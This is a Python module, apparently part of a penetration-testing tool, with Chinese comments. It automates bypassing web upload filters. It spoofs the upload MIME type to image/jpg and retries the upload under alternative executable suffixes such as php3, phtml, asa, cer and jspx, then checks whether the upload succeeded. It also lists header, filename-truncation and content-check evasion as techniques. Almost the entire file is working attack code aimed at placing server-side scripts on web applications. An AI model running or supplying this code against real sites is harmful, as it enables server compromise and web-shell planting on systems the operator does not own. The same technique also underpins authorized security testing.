#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import sys
import os
from comman import *
from color_output import *

"""
1，混淆header，畸形请求
2，混淆文件名，截断，换行
3，MIME
4，文件内容检测绕过
5，同义后缀名替换
...
"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
}

class General:
    def __init__(self, args, data, initUrls, comman, stop=True):
        '''
        初始化
        :param args: args集
        :param data: 传送参数
        :param initUrls: 初始URL集
        :param comman: 通用类
        :param stop: 是否即停
        '''
        self.args = args
        self.data = data
        self.initUrls = initUrls
        self.Comman = comman
        self.stop = stop

    def exploit(self):
        '''
        尝试攻击并检查输出
        :return:
        '''
        p1 = self.mimeBypass()   # MIME绕过
        c1 = self.Comman.checkResult(self.initUrls, p1)
        self.end(check=c1, stop=self.stop)

        p2 = self.rareSuffixBypass()  # 同义后缀名绕过

        self.end(stop=True)
        return

    def end(self, check=False, stop=False):
        # 判断是否结束
        if check == True:
            print(green('[ result ]') + cyan('成功上传'))
        if stop == True:
            print(blue('[ schedule ]') + cyan('测试完毕'))
            sys.exit()
        return


    def fuzzHeaders(self, headers, key, value):
        # 混淆headers
        headers[key] = value
        return headers

    def fuzzRareSuffix(self, suffix, filename):
        # 替换后缀名
        PHP = ['php', 'php2', 'phtml', 'php3', 'php5', 'pHP']
        ASP = ['asa', 'asp', 'aspx', 'ascx', 'ashx', 'cer', 'ASp']
        JSP = ['jsp', 'jspx', 'jSP']
        if suffix in PHP:
            PHP.remove(suffix)
            return [filename.replace(suffix, x) for x in PHP]
        if suffix in ASP:
            ASP.remove(suffix)
            return [filename.replace(suffix, x) for x in ASP]
        if suffix in JSP:
            JSP.remove(suffix)
            return [filename.replace(suffix, x) for x in JSP]
        return []

    def mimeBypass(self, ct='image/jpg'):
        '''
        MIME绕过后端检测
        :return:
        '''
        print(blue('[ schedule ]') + cyan('利用MIME绕过测试'))
        if self.args.mime != '':
            ct = self.args.mime
        elif self.args.ct != '':
            ct = self.Comman.setContentType(self.args.ct)
        print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(ct))
        if self.args.attach != '':  # 使用attach文件上传
            file = self.args.attach
        else:
            file = self.args.f
        files = self.setFiles(self.args.field, file=file, ct=ct)
        res = self.Comman.upload(self.args.u, files, data=self.data)
        return res

    def rareSuffixBypass(self):
        '''
        同义后缀名替换
        :return:
        '''
        if self.args.attach != '':  # 存在attach文件，获取后缀名备用
            file = self.args.attach
            filename = self.Comman.getFilename(self.args.attach)
        else:
            file = self.args.f
            filename = self.Comman.getFilename(self.args.f)
        suffix = self.getSuffix(filename)
        if suffix == False:
            return False
        fns = self.fuzzRareSuffix(suffix, filename)
        for f in fns:
            files = self.setFiles(
                field=self.args.field,
                file=file,
                filename=f
            )
            res = self.Comman.upload(self.args.u, files, self.data)
            check = self.Comman.checkResult(self.initUrls, res)
            self.end(check=check, stop=self.stop)
        return

    def getSuffix(self, filename):
        # 获取文件名后缀
        try:
            ext = filename.split('.')[-1]
            return ext
        except:
            print(red('[ Error ]') + yellow('获取文件后缀名失败'))
            return False

    def setAttachFiles(self, field, file, attach, ct='', other={}):
        # 设置attach文件
        try:
            files = {
                field: (
                attach,
                open(file, 'rb'),
                ct,
                other
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()


    def setFiles(self, field, file, filename='', ct='', other={}):
        # 设置文件
        if filename == '':
            filename = self.Comman.getFilename(file)
        try:
            files = {
                field: (
                filename,
                open(file, 'rb'),
                ct,
                other
            )
            }
            # print(files)
            return files
        except:
            print(red('[ Error ]') + yellow('读取文件失败'))
            sys.exit()

